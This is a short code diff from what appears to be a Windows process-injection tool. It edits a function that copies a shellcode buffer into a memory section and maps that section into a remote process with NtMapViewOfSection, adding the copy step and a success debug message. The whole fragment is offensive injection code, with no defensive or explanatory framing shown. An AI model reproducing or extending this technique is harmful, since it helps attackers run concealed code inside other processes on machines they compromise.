@@ -44,6 +44,8 @@ BOOL AllocateMemory_Section(INJECT_CTX *ctx) {
         return FALSE;
     }
 
+    RtlCopyMemory(hLocalAddress, ctx->shellcode.data(), ctx->shellcodeSize);
+
     // map section into memory of remote process
 
     status = ctx->api.ntMapViewOfSection(
@@ -62,6 +64,9 @@ BOOL AllocateMemory_Section(INJECT_CTX *ctx) {
         DBG("Failed to map section to remote process. NTSTATUS: 0x%08X", status);
         ctx->lastStatus = status;
         return FALSE;
+    }
+    else {
+        DBG("Mapped section to remote process at 0x%p", ctx->remoteBase);
     }
 
     return TRUE;
